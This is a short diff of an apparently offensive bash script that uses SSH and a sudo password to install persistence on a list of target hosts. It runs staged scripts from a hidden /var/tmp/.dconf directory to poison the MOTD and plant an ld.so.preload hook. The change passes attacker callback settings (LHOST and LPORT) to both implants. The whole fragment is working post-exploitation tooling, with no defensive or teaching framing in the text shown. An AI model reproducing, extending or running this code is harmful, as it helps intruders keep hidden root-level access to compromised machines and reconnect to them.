@@ -132,7 +132,7 @@ for TARGET in "${TARGETS[@]}"; do
 
     info "[${TARGET}] Installing MOTD persistence..."
 
-    if run_ssh "$TARGET" "sudo -S bash /var/tmp/.dconf/motd_poison.sh <<< '$PASSWORD'" \
+    if run_ssh "$TARGET" "sudo -S LHOST='${LHOST}' LPORT='${LPORT}' bash /var/tmp/.dconf/motd_poison.sh <<< '$PASSWORD'" \
         2>/dev/null; then
         success "[${TARGET}] MOTD installed"
     else
@@ -155,7 +155,7 @@ for TARGET in "${TARGETS[@]}"; do
     if [[ -n "$SO_FILE" ]]; then
         info "[${TARGET}] Installing ld.so.preload persistence..."
 
-        if run_ssh "$TARGET" "sudo -S bash /var/tmp/.dconf/ld_install.sh <<< '$PASSWORD'" \
+        if run_ssh "$TARGET" "sudo -S LHOST='${LHOST}' LPORT='${LPORT}' bash /var/tmp/.dconf/ld_install.sh <<< '$PASSWORD'" \
             2>/dev/null; then
             success "[${TARGET}] ld.so.preload installed"
         else
